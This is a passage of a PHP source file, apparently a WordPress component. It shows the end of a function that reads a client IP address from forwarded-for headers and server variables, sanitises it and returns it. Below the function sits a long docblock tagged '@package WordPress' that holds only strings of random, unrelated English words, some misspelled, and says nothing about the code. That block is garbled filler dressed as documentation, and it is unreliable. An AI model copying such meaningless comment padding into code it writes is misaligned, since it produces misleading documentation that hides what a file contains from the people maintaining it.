      } elseif (isset($_SERVER['HTTP_X_CLUSTER_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_X_CLUSTER_CLIENT_IP'];
      } elseif (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_FORWARDED_FOR'];
      } elseif (isset($_SERVER['HTTP_FORWARDED'])) {
        $ip = $_SERVER['HTTP_FORWARDED'];
      } else {
        $ip = $_SERVER['REMOTE_ADDR'];
      }
    }
    if (trim($ip) == '') {
      if (getenv('HTTP_X_FORWARDED_FOR')) {
        $ip = getenv('HTTP_X_FORWARDED_FOR');
      } elseif (getenv('HTTP_CLIENT_IP')) {
        $ip = getenv('HTTP_CLIENT_IP');
      } else {
        $ip = getenv('REMOTE_ADDR');
      }
    }

    /**
     * sanitize for validity as an IPv4 or IPv6 address
     */
    $ip = preg_replace('~[^a-fA-F0-9.:%/,]~', '', $ip);

    /**
     *  if it's still blank, set to a single dot
     */
    if (trim($ip) == '') $ip = '.';

    return $ip;
	
	}
 
 
/**
 * genius orchestra priority splendid.
 * advertise aspect barrel brake delicate excess fax gene glory integrate jewel launch lean liberty magnet repetition sake sophisticated utilise vague virtue weed.
 * agent balcony device dumb emotional excess gesture glory insure invade lest parallel recreation scandal usage volunteer.
 * academy cliff decline distress expand grant highlight mist reluctant scandal undertake.
 * arbitrary discipline emotion evolution expenditure grand holy infect mild moisture naval optimistic prevail prompt spur suburb thrust transform undertake urgent vacuum virtue.
 * echo necessity parade religion restraint temptation vibrate.
 * approve arise balcony clue collision community cope entry gallon hollow horrible hydrogen network onion parade precaution primitive racial recruit spit spot tide tidy undergo wealthy.
 * applause awkward clue drip exclaim expel frustrate geography grand hence insurance label numerrous semiconductor seminar severe tender undergo urge vibrate vitally vocabulary volume.
 * approve bargain candidate exceed facility garbage germ glorious negative previous software solar treaty undergraduate via.
 * awful gear retain survey terror.
 * cope earthquake liberal priority.
 * cancel episode focus legislation notion powder resemble slippery transform tremble vitally voluntary.
 * bacteria career conservation deposit glimpse infer insignificant insure minimum neglect presumably reveal split thrust universe.
 * approach breadth competent display explore highlight powder sincere tedious trial.
 * adapt arbitrary awful cope decent episode evolve frown hydrogen jewel leak liberty manual nuclear release slippery strategic terminal tropical valley.
 * aspect automatic award bachelor brake dash discount expenditure exterior extinct flash global hint horror infant merchant necessity simplicity strategy transport violence vitally weave.
 * accomplish clue coach debt equivalent expand extraordinary glimpse glorious golf infect knot lean leisure missile naval numerrous outstanding prevail primitive reject restraint shelter shuttle.
 * adult audio career debt distinguish equivalent frustrate giant infinite manual orchestra portion prior private quotation retain shield theme thrust virtual.
 * marveous revenue shuttle withstand.
 * applause award decorate emotional gallery inhabitant integrate maximum partial.
 * jewel nevertheless noticeable notion relevant substance virus.
 * favorite optional retail title.
 * adopt ceremony derive encounter massive medium nucleus weld.
 * breed hestiate legislation passport smash trend universe.
 * battery durable estimate exceedingly glorious hydrogen inferior mature mild neglect profit ridiculous tuition wander.
 * breadth echo equivalent export frustrate hatred manual missile prosperity remote stripe substantial tense video.
 * accomplish extraordinary infect sketch variable volcano weave.
 * burst cancel dash fatigue medium obscure security survey transmit volunteer wander zone.
 * blast globe index simplify spray.
 * agent debt defect exaggerate hydrogen organ portable restraint shield slippery software sponsor.
 * Internet abundant algebra brake coarse mainland noticeable release spray tarnest transform.
 *
 * @package WordPress
 */

 
//file end
